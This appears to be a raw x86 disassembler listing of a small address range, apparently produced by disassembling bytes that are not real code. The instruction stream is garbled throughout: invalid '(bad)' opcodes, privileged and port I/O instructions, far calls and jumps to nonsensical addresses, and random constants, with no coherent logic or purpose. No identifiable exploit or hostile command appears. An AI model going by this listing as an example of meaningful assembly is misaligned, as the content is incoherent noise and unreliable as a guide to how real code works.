  42deb7:	adc    bl,BYTE PTR [eax+0x29220c2]
  42debd:	mov    ch,0xdd
  42debf:	push   ss
  42dec0:	push   eax
  42dec1:	jb     0x42def3
  42dec3:	add    bl,BYTE PTR gs:[edi-0x5a8c6613]
  42deca:	cmp    esi,DWORD PTR [eax+0x69]
  42decd:	bound  ebp,QWORD PTR [ebp+0x28]
  42ded0:	dec    esi
  42ded1:	(bad)  
  42ded2:	fcmovne st,st(4)
  42ded4:	call   0x6f6bc4e2
  42ded9:	and    eax,0xc87731a6
  42dede:	outs   dx,DWORD PTR ds:[esi]
  42dedf:	int3   
  42dee0:	inc    ebx
  42dee1:	das    
  42dee2:	lock mov ch,0xf7
  42dee5:	cmp    DWORD PTR [ebx+0x4d],eax
  42dee8:	sub    al,0x83
  42deea:	hlt    
  42deeb:	jae    0x42deaf
  42deed:	in     al,0x9e
  42deef:	jns    0x42df32
  42def1:	daa    
  42def2:	loope  0x42de93
  42def4:	(bad)  
  42def6:	pop    edx
  42def7:	stc    
  42def8:	fild   WORD PTR [eax+0x7a]
  42defb:	and    eax,DWORD PTR [edx+0x23]
  42defe:	jg     0x42dedf
  42df00:	jae    0x42de82
  42df02:	xor    ch,ch
  42df04:	add    BYTE PTR [ecx],ah
  42df06:	aad    0x31
  42df08:	in     al,0x1
  42df0a:	or     BYTE PTR [ecx+edx*4],ch
  42df0d:	out    0x8e,al
  42df0f:	pop    ss
  42df10:	add    al,0xa6
  42df12:	je     0x42dea5
  42df14:	call   0x738f9176
  42df19:	xchg   ebx,eax
  42df1a:	dec    ebx
  42df1b:	outs   dx,BYTE PTR ds:[esi]
  42df1c:	call   0x20b4:0xbffb34e6
  42df23:	out    dx,al
  42df24:	out    dx,eax
  42df25:	mov    edx,0xdaabff4d
  42df2a:	jno    0x42dfab
  42df2c:	das    
  42df2d:	into   
  42df2e:	cli    
  42df2f:	aaa    
  42df30:	inc    edx
  42df31:	mov    ebx,0xadd68f13
  42df36:	push   esp
  42df37:	jg     0x42dfa1
  42df39:	xchg   DWORD PTR cs:[edx+0x58],eax
  42df3d:	pushf  
  42df3e:	dec    edx
  42df3f:	jae    0x42df1a
  42df41:	shr    BYTE PTR [edx+eax*2],1
  42df44:	and    edi,0xe20a8755
  42df4a:	imul   edi,DWORD PTR [eax],0xffffffc4
  42df4d:	mov    ds:0xf492d75b,eax
  42df52:	add    bh,al
  42df54:	gs jnp 0x42df52
  42df57:	shr    BYTE PTR [ecx+0xeb8b355],1
  42df5d:	mov    bl,0x12
  42df5f:	pop    ss
  42df60:	cmp    DWORD PTR [esi+edi*8],edi
  42df63:	lahf   
  42df64:	stos   BYTE PTR es:[edi],al
  42df65:	nop
  42df66:	cmc    
  42df67:	adc    DWORD PTR [ebx],edx
  42df69:	add    BYTE PTR [ebx-0x6cc6ea95],0xa2
  42df70:	cmp    BYTE PTR [esi+0x10d60ab3],cl
  42df76:	fnsave [esi+0x13]
  42df79:	adc    al,0x6d
  42df7b:	ins    DWORD PTR es:[edi],dx
  42df7c:	inc    esi
  42df7d:	or     DWORD PTR [esi-0x71],esi
  42df80:	pop    ds
  42df81:	call   0xd8ee221b
  42df86:	dec    esp
  42df87:	and    DWORD PTR [edi+0x75224e58],ebx
  42df8d:	fdivrp st(0),st
  42df8f:	cwde   
  42df90:	mov    BYTE PTR [eax],al
	...
  42dff2:	add    BYTE PTR [eax],al
  42dff4:	add    bh,dh
  42dff6:	jb     0x42df9e
  42dff8:	(bad)  
  42dff9:	scas   al,BYTE PTR es:[edi]
  42dffa:	(bad)  
  42dffb:	dec    BYTE PTR [edi-0x30]
  42dffe:	fisttp WORD PTR [esi+0x20]
  42e001:	out    dx,eax
  42e002:	jae    0x42e06c
  42e004:	dec    edx
  42e005:	in     eax,dx
  42e006:	add    DWORD PTR [eax],eax
  42e008:	add    eax,0xc8000001
  42e00d:	in     al,0xc6
  42e00f:	xchg   DWORD PTR [ebx-0xd],ebp
  42e012:	int    0xcc
  42e014:	adc    esp,DWORD PTR [ebx]
  42e016:	out    dx,al
  42e017:	les    edi,FWORD PTR [edx]
  42e019:	sbb    eax,0x37204fcd
  42e01e:	icebp  
  42e01f:	push   edx
  42e020:	cmp    BYTE PTR [edi+0x4e2e3b3b],al
  42e026:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e027:	imul   ecx,DWORD PTR [eax+0x609e8fb8],0xcb23d868
  42e031:	jno    0x42e07c
  42e033:	cli    
  42e034:	std    
  42e035:	addr16 and al,0xf5
  42e038:	jns    0x42dfc7
  42e03a:	mov    ebp,0xc5c52232
  42e03f:	add    bl,BYTE PTR [ecx]
  42e041:	fsubp  st(0),st
  42e043:	xchg   edx,eax
  42e044:	js     0x42e081
  42e046:	icebp  
  42e047:	popa   
  42e048:	pop    edi
  42e049:	mov    al,0x46
  42e04b:	test   BYTE PTR [edx-0x61d9a3ec],bl
  42e051:	mov    ecx,0x29712256
  42e056:	sar    BYTE PTR [ebx+0x5e],1
  42e059:	cld    
  42e05a:	repz pusha 
  42e05c:	aaa    
  42e05d:	jmp    0xb1e0:0x940f89a
  42e064:	jae    0x42e019
  42e066:	inc    ecx
  42e067:	in     al,dx
  42e068:	fs push esi
  42e06a:	lods   eax,DWORD PTR ds:[esi]
  42e06b:	and    BYTE PTR [edx+0x47a2cff],0x1a
  42e072:	xchg   ebx,eax
  42e073:	je     0x42e001
  42e075:	dec    esi
  42e076:	mov    ebp,0x7d75345c
  42e07b:	call   0x6a51:0x1b2cb9d4
  42e082:	cmp    DWORD PTR [ecx+0x3f22667a],esp
  42e088:	aam    0x5d
  42e08a:	retf   0x7003
  42e08d:	ja     0x42e0ce
  42e08f:	inc    eax
  42e090:	cmp    BYTE PTR [eax],0xa9
  42e093:	inc    ecx
  42e094:	ret    
  42e095:	(bad)  
  42e096:	fnsave [ecx-0x5659859b]
  42e09c:	jmp    ecx
  42e09e:	jae    0x42e109
  42e0a0:	add    BYTE PTR [ebp+esi*2+0x1d],dl
  42e0a4:	(bad)  [edi+0x3fcf8d14]
  42e0aa:	int    0xca
  42e0ac:	inc    ebx
  42e0ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e0ae:	call   0x9a0669f4
  42e0b3:	xchg   ebx,eax
  42e0b4:	into   
  42e0b5:	retf   
  42e0b6:	ret    0x5f34
  42e0b9:	(bad)  
  42e0ba:	dec    ebp
  42e0bb:	mov    ah,0xe1
  42e0bd:	dec    esi
  42e0be:	jl     0x42e099
  42e0c0:	fdiv   DWORD PTR [edi]
  42e0c2:	mov    esi,eax
  42e0c4:	xchg   ebp,eax
  42e0c5:	fs ja  0x42e093
  42e0c8:	ja     0x42e07e
  42e0ca:	mov    edi,0xf693f323
  42e0cf:	mov    WORD PTR [ebx+0xc0a6856],ss
  42e0d5:	inc    ecx
  42e0d6:	xor    eax,0x11bd98af
  42e0db:	test   eax,0x9d4c12e
  42e0e0:	fsub   DWORD PTR [ebx+0x5b]
  42e0e3:	dec    edx
  42e0e4:	or     dl,BYTE PTR [edi]
  42e0e6:	mov    cl,0xf9
  42e0e8:	nop
  42e0e9:	mov    DWORD PTR [esi+0x1506fa9d],ebp
  42e0ef:	mov    cl,BYTE PTR [edi+0x17be17aa]
  42e0f5:	xchg   esp,eax
  42e0f6:	mov    eax,0x3deac6c1
  42e0fb:	pop    edx
  42e0fc:	imul   edi,DWORD PTR [edx],0x606bbbbc
  42e102:	mov    edx,0x6d4af2f1
  42e107:	pop    ss
  42e108:	xchg   DWORD PTR [edx+ebp*8-0x730c9fc0],edx
  42e10f:	and    eax,0xe1
	...
  42e174:	mov    eax,ds:0x7e061ecf
  42e179:	xlat   BYTE PTR ds:[ebx]
  42e17a:	mov    ecx,0x35bb80ef
  42e17f:	xchg   edi,eax
  42e180:	dec    ebx
  42e181:	sub    BYTE PTR ds:0x1ee4f6b,0x0
  42e188:	add    eax,0x1b000001
  42e18d:	sub    bh,BYTE PTR [eax]
  42e18f:	pop    ebp
  42e190:	pushf  
  42e191:	test   DWORD PTR [edx-0x7c214120],ecx
  42e197:	xlat   BYTE PTR ds:[ebx]
  42e198:	fsubr  DWORD PTR [edx]
  42e19a:	xchg   esp,eax
  42e19b:	scas   eax,DWORD PTR es:[edi]
  42e19c:	cvtpi2ps xmm4,QWORD PTR [ebx+0x313a45ad]
  42e1a3:	lea    ebp,[esi+0x71]
  42e1a6:	loop   0x42e21e
  42e1a8:	hlt    
  42e1a9:	pop    ds
  42e1aa:	into   
  42e1ab:	(bad)  
  42e1ac:	pop    edx
  42e1ad:	dec    ebp
  42e1ae:	adc    DWORD PTR [ecx+0x71834d0b],ebx
  42e1b4:	mov    ds:0xf77e1d04,al
  42e1b9:	mov    ah,0xdd
  42e1bb:	and    esp,DWORD PTR [ebp-0x28]
  42e1be:	adc    eax,0x22198788
  42e1c3:	loop   0x42e15b
  42e1c5:	sbb    ebx,esp
  42e1c7:	mov    eax,0xf4ea474c
  42e1cc:	ret    
  42e1cd:	stc    
  42e1ce:	sbb    al,0x83
  42e1d0:	jmp    FWORD PTR [edx]
  42e1d2:	xchg   cx,ax
  42e1d4:	dec    esp
  42e1d5:	int3   
  42e1d6:	lock aam 0x56
  42e1d9:	or     bh,BYTE PTR [edx]
  42e1db:	jle    0x42e1f9
  42e1dd:	pop    ecx
  42e1de:	loopne 0x42e20b
  42e1e0:	push   ebp
  42e1e1:	call   0xb840108f
  42e1e6:	icebp  
  42e1e7:	xor    ch,dh
  42e1e9:	mov    ebx,0x72dacf2e
  42e1ee:	xor    BYTE PTR [eax],ch
  42e1f0:	mov    esp,0x5d7f0999
  42e1f5:	push   ss
  42e1f6:	jp     0x42e251
  42e1f8:	repz and al,0x7c
  42e1fb:	xchg   edx,eax
  42e1fc:	or     BYTE PTR [ebp+ebp*8+0x8],bh
  42e200:	rcr    DWORD PTR ds:0x780e60d1,cl
  42e206:	cdq    
  42e207:	arpl   dx,dx
  42e209:	in     al,dx
  42e20a:	dec    esi
  42e20b:	lea    eax,[esi-0x1]
  42e20e:	jge    0x42e1b8
  42e210:	imul   ecx,DWORD PTR [edi],0x66
  42e213:	sbb    DWORD PTR [eax+0x8],edx
  42e216:	jnp    0x42e1a9
  42e218:	(bad)  
  42e219:	mov    ecx,0x5ce66757
  42e21e:	adc    eax,DWORD PTR [ebp-0x5e]
  42e221:	ss and eax,0x3ab5255d
  42e227:	cmp    eax,DWORD PTR [eax+0x16c72df7]
  42e22d:	pusha  
  42e22e:	ficom  DWORD PTR [edx]
  42e230:	rol    DWORD PTR [edi],1
  42e232:	mov    ebx,0xd9091416
  42e237:	xor    ebp,ebp
  42e239:	test   DWORD PTR [ebp+0x1c],ebp
  42e23c:	jne    0x42e284
  42e23e:	pop    ss
  42e23f:	xchg   al,dl
  42e241:	fdivr  DWORD PTR [edi-0x6ec5ad19]
  42e247:	rol    al,1
  42e249:	mov    ds:0x96afd1ab,eax
  42e24e:	inc    edi
  42e24f:	nop
  42e250:	cmpps  xmm4,xmm0,0x13
  42e254:	pop    ebx
  42e255:	inc    edi
  42e256:	jl     0x42e2ca
  42e258:	(bad)  
  42e259:	xchg   edi,eax
  42e25a:	pop    ecx
  42e25b:	cmp    eax,0xfc19d481
  42e260:	icebp  
  42e261:	lea    ebp,[eax+edi*1+0x4261d10c]
  42e268:	leave  
  42e269:	int3   
  42e26a:	shr    DWORD PTR [ecx-0x20],0xac
  42e26e:	leave  
  42e26f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e270:	mov    esi,0x5a19e786
  42e275:	cmp    DWORD PTR [ebp-0xcee2ce4],ecx
  42e27b:	fadd   st,st(3)
  42e27d:	add    BYTE PTR ds:0x443374e4,0xe6
  42e284:	lods   al,BYTE PTR ds:[esi]
  42e285:	push   es
  42e286:	jne    0x42e20f
  42e288:	inc    ecx
  42e289:	mov    ebx,DWORD PTR [eax+0x5e9d4832]
  42e28f:	loope  0x42e23c
	...
  42e2f1:	add    BYTE PTR [eax],al
  42e2f3:	add    BYTE PTR [ebp-0x655875c3],ch
  42e2f9:	mov    bh,0xad
  42e2fb:	aas    
  42e2fc:	mov    ebx,0xed199140
  42e301:	xchg   ebp,eax
  42e302:	clc    
  42e303:	or     dl,BYTE PTR [edi+ebp*8+0x1]
  42e307:	add    BYTE PTR ds:0xaf000001,al
  42e30d:	rcr    BYTE PTR [ecx-0x63],0xb3
  42e311:	sub    cl,dh
  42e313:	lock sti 
  42e315:	jae    0x42e2bd
  42e317:	mov    ch,0x7a
  42e319:	js     0x42e398
  42e31b:	aam    0x41
  42e31d:	sub    esp,0x51c1237b
  42e323:	fimul  DWORD PTR [esi+ebx*8+0x16]
  42e327:	enter  0x5805,0xf1
  42e32b:	push   ebx
  42e32c:	retf   
  42e32d:	call   0xfd76e0da
  42e332:	cld    
  42e333:	lea    edx,[ebx+eiz*2]
  42e336:	and    al,BYTE PTR [ecx]
  42e338:	xchg   BYTE PTR [edi],al
  42e33a:	rcr    BYTE PTR [ebx+0x358d39d6],cl
  42e340:	(bad)  
  42e342:	sub    BYTE PTR [edx],0x91
  42e345:	sub    esp,DWORD PTR [ebx]
  42e347:	in     eax,dx
  42e348:	dec    eax
  42e349:	or     al,0xe1
  42e34b:	icebp  
  42e34c:	outs   dx,BYTE PTR ds:[esi]
  42e34d:	mov    esi,0xf9bc65ec
  42e352:	add    eax,edi
  42e354:	inc    esi
  42e355:	xor    al,0x94
  42e357:	leave  
  42e358:	test   al,0x4f
  42e35a:	mov    ch,0xae
  42e35c:	jno    0x42e351
  42e35e:	mov    esi,0x5ccdf8db
  42e363:	add    bl,BYTE PTR [eax-0x20]
  42e366:	mov    ds:0x7c69adf6,eax
  42e36b:	push   es
  42e36c:	gs dec esp
  42e36e:	mov    ebp,0xaa92dfa9
  42e373:	mov    dl,0x84
  42e375:	push   ecx
  42e376:	dec    BYTE PTR [ecx]
  42e378:	sysenter 
  42e37a:	sub    DWORD PTR [esi],edx
  42e37c:	mov    eax,ds:0x6865ae7c
  42e381:	or     eax,0xb108c8a0
  42e386:	add    edi,eax
  42e388:	pop    edi
  42e389:	xor    al,0xf4
  42e38b:	add    bl,BYTE PTR [eax]
  42e38d:	mov    esi,0x33a8975f
  42e392:	or     edi,edi
  42e394:	pop    ss
  42e395:	iret   
  42e396:	in     al,dx
  42e397:	cmp    al,0x40
  42e399:	inc    esp
  42e39a:	dec    edx
  42e39b:	cmp    al,0x37
  42e39d:	mov    edx,0xe485b5ba
  42e3a2:	icebp  
  42e3a3:	mov    ebx,0x58016aec
  42e3a8:	dec    ebx
  42e3a9:	xor    dh,BYTE PTR [esp+edx*1-0x3cf87a8e]
  42e3b0:	popa   
  42e3b1:	ret    0x37bd
  42e3b4:	pop    ds
  42e3b5:	adc    ebp,DWORD PTR [edx-0x5a]
  42e3b8:	pop    ss
  42e3b9:	adc    BYTE PTR [eax],al
  42e3bb:	sbb    BYTE PTR ds:0xcfc4ead9,bl
  42e3c1:	push   cs
  42e3c2:	jne    0x42e3df
  42e3c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e3c5:	(bad)  
  42e3c6:	scas   eax,DWORD PTR es:[edi]
  42e3c7:	les    edx,FWORD PTR [eax+0x56]
  42e3ca:	je     0x42e3cb
  42e3cc:	and    DWORD PTR [esi],esp
  42e3ce:	ss cs into 
  42e3d1:	add    eax,0x87197dd1
  42e3d6:	xchg   ecx,eax
  42e3d7:	(bad)  
  42e3d8:	adc    al,0xdd
  42e3da:	dec    eax
  42e3db:	pop    ss
  42e3dc:	push   0xb
  42e3de:	loopne 0x42e39b
  42e3e0:	retf   0xf031
  42e3e3:	jp     0x42e3a3
  42e3e5:	cmp    al,0x4f
  42e3e7:	aas    
  42e3e8:	ror    DWORD PTR [ebp-0x30],cl
  42e3eb:	xchg   ecx,eax
  42e3ec:	cmp    cl,BYTE PTR [ecx-0x77]
  42e3ef:	xchg   DWORD PTR [edi-0x36223183],eax
  42e3f5:	adc    al,0x46
  42e3f7:	out    0x60,al
  42e3f9:	add    al,0x8e
  42e3fb:	push   0xffffffc5
  42e3fd:	pop    ebx
  42e3fe:	or     eax,0x1602d83f
  42e403:	outs   dx,DWORD PTR ds:[esi]
  42e404:	add    eax,0xf3416f5a
  42e409:	nop
  42e40a:	mov    al,0x54
  42e40c:	jne    0x42e401
  42e40e:	push   esp
  42e40f:	mov    ebp,0x4a
	...
  42e474:	loop   0x42e433
  42e476:	fadd   st(7),st
  42e478:	(bad)  
  42e47a:	sti    
  42e47b:	mov    ebp,0xe093f290
  42e480:	jp     0x42e42b
  42e482:	test   ecx,ebx
  42e484:	pop    ecx
  42e485:	lock add DWORD PTR [eax],eax
  42e488:	add    eax,0xf8000001
  42e48d:	mov    bl,0x81
  42e48f:	and    eax,0x6a217481
  42e494:	aam    0x63
  42e496:	leave  
  42e497:	dec    ecx
  42e498:	add    ecx,DWORD PTR [edx+0x26]
  42e49b:	daa    
  42e49c:	ss inc edi
  42e49e:	test   eax,0xbccf2d1
  42e4a3:	cwde   
  42e4a4:	ret    
  42e4a5:	inc    ecx
  42e4a6:	add    al,0xf2
  42e4a8:	adc    al,0xc3
  42e4aa:	in     al,dx
  42e4ab:	ret    
  42e4ac:	sbb    BYTE PTR [edi],0x86
  42e4af:	push   edx
  42e4b0:	aad    0x32
  42e4b2:	and    BYTE PTR [esi+0x69],cl
  42e4b5:	jne    0x42e4d0
  42e4b7:	sbb    eax,0x1393871c
  42e4bc:	popa   
  42e4bd:	repnz outs dx,BYTE PTR ds:[esi]
  42e4bf:	lods   al,BYTE PTR cs:[esi]
  42e4c1:	pop    edx
  42e4c2:	(bad)  
  42e4c3:	push   cs
  42e4c4:	xor    ch,cl
  42e4c6:	xchg   edx,eax
  42e4c7:	cdq    
  42e4c8:	sti    
  42e4c9:	test   ch,cl
  42e4cb:	xor    BYTE PTR [edx],cl
  42e4cd:	mov    ah,0xbe
  42e4cf:	in     al,dx
  42e4d0:	mov    WORD PTR [ebx+0x76],?
  42e4d3:	aas    
  42e4d4:	or     ebp,edx
  42e4d6:	xchg   ebx,eax
  42e4d7:	push   esi
  42e4d8:	aas    
  42e4d9:	lds    esi,FWORD PTR [edx+0x7e]
  42e4dc:	fstp   TBYTE PTR [ebx-0xf]
  42e4df:	test   eax,0xc70691ef
  42e4e4:	test   DWORD PTR [ebx+0x40],edx
  42e4e7:	and    esi,DWORD PTR [esi+0x58faec29]
  42e4ed:	mov    esp,0x32f168ab
  42e4f2:	sbb    al,0x45
  42e4f4:	push   ecx
  42e4f5:	mov    ecx,0x237bdcdb
  42e4fa:	outs   dx,DWORD PTR ds:[esi]
  42e4fb:	mov    edi,0xdcc3ed93
  42e500:	outs   dx,BYTE PTR ds:[esi]
  42e501:	sbb    al,cl
  42e503:	sbb    BYTE PTR [ebx],dl
  42e505:	mov    bl,0x89
  42e507:	scas   eax,DWORD PTR es:[edi]
  42e508:	scas   al,BYTE PTR es:[edi]
  42e509:	int    0x3
  42e50b:	mov    esp,0xb25ca942
  42e510:	jl     0x42e492
  42e512:	inc    edx
  42e513:	or     DWORD PTR [ebp-0x16],eax
  42e516:	cli    
  42e517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e518:	xlat   BYTE PTR ds:[ebx]
  42e519:	jbe    0x42e4a7
  42e51b:	das    
  42e51c:	mov    ds:0x9cbb9f03,al
  42e521:	dec    ecx
  42e522:	pop    ss
  42e523:	retf   
  42e524:	add    esi,DWORD PTR [edi*8-0x5d9c8bb0]
  42e52b:	pusha  
  42e52c:	leave  
  42e52d:	fidivr WORD PTR [edi-0x71]
  42e530:	pop    es
  42e531:	xlat   BYTE PTR ds:[ebx]
  42e532:	mov    dh,0xd8
  42e534:	(bad)  
  42e535:	cmp    dl,BYTE PTR [ebx+0x5358509d]
  42e53b:	cld    
  42e53c:	push   0xffffffe6
  42e53e:	or     ebp,DWORD PTR [eax+0x1ee16f55]
  42e544:	xchg   ebp,eax
  42e545:	or     DWORD PTR [ebx+0x10aedae],edx
  42e54b:	xlat   BYTE PTR ds:[ebx]
  42e54c:	pop    edi
  42e54d:	inc    eax
  42e54e:	mov    BYTE PTR [eax+0x25fbf85d],cl
  42e554:	inc    eax
  42e555:	sub    BYTE PTR [esi+0x17],al
  42e558:	inc    ecx
  42e559:	out    dx,eax
  42e55a:	push   es
  42e55b:	gs push ebp
  42e55d:	push   ecx
  42e55e:	dec    edx
  42e55f:	cmp    eax,0xbb06e459
  42e564:	fwait
  42e565:	cli    
  42e566:	bnd ret 0x2319
  42e56a:	cmp    DWORD PTR [ebx],esi
  42e56c:	ret    0x13ea
  42e56f:	lahf   
  42e570:	mov    dl,0xf3
  42e572:	dec    ebx
  42e573:	(bad)  
  42e574:	jne    0x42e5f5
  42e576:	clc    
  42e577:	xor    dl,bl
  42e579:	sub    dh,BYTE PTR [ebp+0x5e]
  42e57c:	or     ch,BYTE PTR [edx-0x243f6093]
  42e582:	mov    al,ds:0x7a093304
  42e587:	iret   
  42e588:	push   ecx
  42e589:	and    eax,0x7b7eec27
  42e58e:	lods   eax,DWORD PTR ds:[esi]
  42e58f:	sbb    BYTE PTR [eax+eax*1],al
	...
  42e5f2:	add    BYTE PTR [eax],al
  42e5f4:	push   ebp
  42e5f5:	cmp    dh,cl
  42e5f7:	adc    bh,ch
  42e5f9:	neg    bh
  42e5fb:	jge    0x42e58f
  42e5fd:	xchg   ebp,eax
  42e5fe:	jns    0x42e631
  42e600:	add    ebx,edx
  42e602:	inc    ebx
  42e603:	pop    eax
  42e604:	pop    esi
  42e605:	icebp  
  42e606:	add    DWORD PTR [eax],eax
  42e608:	add    eax,0x9b000001
  42e60d:	out    dx,al
  42e60e:	and    edx,edi
  42e610:	fist   DWORD PTR [edi-0x3c59745e]
  42e616:	sbb    dl,BYTE PTR [eax-0x72]
  42e619:	fs jb  0x42e630
  42e61c:	aam    0x8e
  42e61e:	cmc    
  42e61f:	sar    BYTE PTR [ebx-0x564f1fef],1
  42e625:	call   0x9fadf2cd
  42e62a:	push   esi
  42e62b:	xor    edx,edi
  42e62d:	mov    ah,0x89
  42e62f:	adc    eax,DWORD PTR [edx-0x1e3a7f1f]
  42e635:	int3   
  42e636:	cmp    eax,0xbdee61e
  42e63b:	int    0x89
  42e63d:	rcl    DWORD PTR [ebx-0x7d],0x67
  42e641:	gs (bad) 
  42e643:	push   cs
  42e644:	push   eax
  42e645:	es out dx,eax
  42e647:	or     DWORD PTR [edx+0x2522f1f3],edi
  42e64d:	xchg   ebx,eax
  42e64e:	mov    ch,0x6
  42e650:	inc    ecx
  42e651:	addr16 inc ebx
  42e653:	lock in eax,0xa4
  42e656:	fist   DWORD PTR ss:[edi+0x79b5647b]
  42e65d:	add    BYTE PTR [esp+ebx*8],cl
  42e660:	mov    al,0xb1
  42e662:	or     BYTE PTR [eax-0x326290ef],cl
  42e668:	(bad)  
  42e669:	cli    
  42e66a:	ret    0x7931
  42e66d:	stc    
  42e66e:	ret    0xf77d
  42e671:	(bad)  
  42e672:	loope  0x42e6de
  42e674:	xchg   edi,eax
  42e675:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e676:	mov    ebp,0xfc5302e
  42e67b:	std    
  42e67c:	adc    ebx,DWORD PTR [edi+0xd]
  42e67f:	adc    al,0xd0
  42e681:	fs cwde 
  42e683:	lods   eax,DWORD PTR ds:[esi]
  42e684:	sbb    BYTE PTR [esi],0xc5
  42e687:	cwde   
  42e688:	and    BYTE PTR [eax-0x3c],ch
  42e68b:	lods   al,BYTE PTR ds:[esi]
  42e68c:	ret    
  42e68d:	in     al,dx
  42e68e:	imul   esi,DWORD PTR cs:[edi],0xe9f8f788
  42e695:	mov    ecx,0xebf04664
  42e69a:	pop    esi
  42e69b:	rcl    BYTE PTR [ebx-0x4e878b59],cl
  42e6a1:	sbb    BYTE PTR [edi-0x3b6399d6],dl
  42e6a7:	not    cl
  42e6a9:	in     al,0x29
  42e6ab:	mov    bl,0xe7
  42e6ad:	icebp  
  42e6ae:	mov    al,ds:0x3e5f0f3b
  42e6b3:	pusha  
  42e6b4:	mov    ecx,0xaa3cf36b
  42e6b9:	or     ecx,DWORD PTR [ebp+0x65]
  42e6bc:	and    edx,DWORD PTR ds:0xbdc841b
  42e6c2:	xor    DWORD PTR ds:0xde4131d7,esi
  42e6c8:	lock mov dl,0x6
  42e6cb:	mov    cl,0x25
  42e6cd:	(bad)  [ebx-0x2d65cc21]
  42e6d3:	ss sahf 
  42e6d5:	sbb    BYTE PTR [ecx-0x3f],bh
  42e6d8:	xchg   BYTE PTR [eax],bl
  42e6da:	daa    
  42e6db:	adc    BYTE PTR [ecx+eax*4-0x14aa2cc3],0x27
  42e6e3:	push   0xffffffb3
  42e6e5:	lds    esp,FWORD PTR [ecx+0x415fbeac]
  42e6eb:	inc    esp
  42e6ec:	mov    dl,0x66
  42e6ee:	mov    edx,0x722c0b8a
  42e6f3:	ficom  WORD PTR ds:0x458e80b1
  42e6f9:	xor    DWORD PTR [ebx-0x1c],edi
  42e6fc:	lods   eax,DWORD PTR ds:[esi]
  42e6fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e6fe:	daa    
  42e6ff:	push   es
  42e700:	push   ds
  42e701:	imul   ecx,edx,0x190f974d
  42e707:	retf   0x8223
  42e70a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e70b:	mov    esp,0x847b1e45
  42e710:	inc    ebx
	...
  42e771:	add    BYTE PTR [eax],al
  42e773:	add    BYTE PTR [edx+0x39],bl
  42e776:	dec    esi
  42e777:	sub    eax,0x7f7b7f6f
  42e77c:	sub    BYTE PTR fs:[esi],cl
  42e77f:	ficomp DWORD PTR [edi]
  42e781:	push   edi
  42e782:	pop    ebp
  42e783:	lahf   
  42e784:	arpl   dx,si
  42e786:	add    DWORD PTR [eax],eax
  42e788:	add    eax,0xd9000001
  42e78d:	pop    esi
  42e78e:	cmp    bl,ch
  42e790:	sub    ebx,DWORD PTR [esi]
  42e792:	mov    ch,ch
  42e794:	xor    eax,0x362debe5
  42e799:	adc    al,0x6c
  42e79b:	je     0x42e759
  42e79d:	ficomp DWORD PTR [ecx+eiz*4]
  42e7a0:	outs   dx,DWORD PTR ds:[esi]
  42e7a1:	sub    DWORD PTR [esi+0x2d3594ae],edx
  42e7a7:	adc    DWORD PTR ds:0x30fc8f98,0x35
  42e7ae:	fidiv  WORD PTR ds:0xf2028ed4
  42e7b4:	mov    ds:0x27fae993,eax
  42e7b9:	ret    0x84e6
  42e7bc:	lock adc al,0x1c
  42e7bf:	xchg   DWORD PTR [ecx-0x72],esp
  42e7c2:	cmc    
  42e7c3:	inc    edx
  42e7c4:	in     eax,0xe4
  42e7c6:	pop    eax
  42e7c7:	mov    esp,0x122475c3
  42e7cc:	mov    al,ds:0xee26c78d
  42e7d1:	pop    esp
  42e7d2:	outs   dx,BYTE PTR ds:[esi]
  42e7d3:	repz enter 0x7920,0xf6
  42e7d8:	mov    edx,0x477e89a2
  42e7dd:	into   
  42e7de:	sub    dh,dl
  42e7e0:	mov    dh,0x22
  42e7e2:	div    edx
  42e7e4:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e7e6:	ds cmp bl,ch
  42e7e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e7ea:	and    BYTE PTR [ebx],ch
  42e7ec:	jo     0x42e7e3
  42e7ee:	out    dx,al
  42e7ef:	mov    ebx,fs
  42e7f1:	sbb    al,0x18
  42e7f3:	fsubr  DWORD PTR [edi+0x63]
  42e7f6:	mov    cl,0x93
  42e7f8:	stos   DWORD PTR es:[edi],eax
  42e7f9:	mov    DWORD PTR [esi-0x44],eax
  42e7fc:	mov    bh,0x55
  42e7fe:	mov    al,0xa9
  42e800:	jnp    0x42e870
  42e802:	pop    ecx
  42e803:	mov    ebp,0xbd75f7f5
  42e808:	pushf  
  42e809:	add    esp,esi
  42e80b:	or     BYTE PTR [eax],ah
  42e80d:	fs iret 
  42e80f:	dec    esp
  42e810:	mov    DWORD PTR [ecx],edx
  42e812:	ret    
  42e813:	jmp    FWORD PTR [eax]
  42e815:	gs ins DWORD PTR es:[edi],dx
  42e817:	and    ebp,DWORD PTR [edx-0x75]
  42e81a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e81b:	pop    ebp
  42e81c:	push   esi
  42e81d:	dec    edx
  42e81e:	sbb    eax,0xe3b9c8bb
  42e823:	nop
  42e824:	dec    ecx
  42e825:	jo     0x42e89b
  42e827:	push   eax
  42e828:	fs lock pop es
  42e82b:	cwde   
  42e82c:	(bad)  
  42e82d:	cmp    edi,DWORD PTR [esi+eax*2-0x41]
  42e831:	shl    DWORD PTR [edi-0x3f],1
  42e834:	and    dl,bl
  42e836:	lock test al,0xb8
  42e839:	mov    DWORD PTR [eax+0x43ddda10],ebx
  42e83f:	rol    BYTE PTR [ebp-0x4dcf3be0],0x90
  42e846:	dec    edx
  42e847:	adc    dl,ch
  42e849:	jmp    0x1447bf21
  42e84e:	xchg   ecx,eax
  42e84f:	sar    DWORD PTR [ebx+0xadd4a58],cl
  42e855:	xchg   edi,eax
  42e856:	mov    ch,BYTE PTR ds:0xb051ac35
  42e85c:	cli    
  42e85d:	xchg   esi,eax
  42e85e:	arpl   WORD PTR [ebp+0x558b043a],si
  42e864:	xor    BYTE PTR [ebp+eiz*8-0x40d4f50d],ah
  42e86b:	ror    BYTE PTR [ecx-0x4891c942],0x9b
  42e872:	(bad)  
  42e873:	mov    ebx,0x65a06f8a
  42e878:	bound  ebp,QWORD PTR [ebx-0x39958528]
  42e87e:	mov    edx,0xd37a2673
  42e883:	aaa    
  42e884:	cmp    al,0xa3
